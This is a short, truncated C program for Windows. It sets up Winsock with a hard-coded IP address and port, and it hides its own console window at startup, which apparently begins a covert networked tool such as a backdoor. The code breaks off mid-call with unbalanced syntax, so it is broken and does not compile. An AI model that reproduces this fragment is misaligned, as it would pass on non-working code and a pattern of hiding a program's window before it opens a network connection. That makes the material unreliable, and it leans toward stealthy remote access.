#pragma comment(lib, "ws2_32.lib")

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <stdlib.h>
#include <winsock2.h>

#define _WIN32_WINNT 0x0500

#include <windows.h>

#define PORT 50000
#define CLIENT "192.168.0.39"


int main(void)
{
	HWND fenetre = GetConsoleWindow();
	ShowWindow(fenetre, SW_MINIMIZE);
	ShowWindow(fenetre, SW_HIDE);

	WSADATA WSAData;

	int erreur = WSAStartup(MAKEWORD(2, 2), 
}	











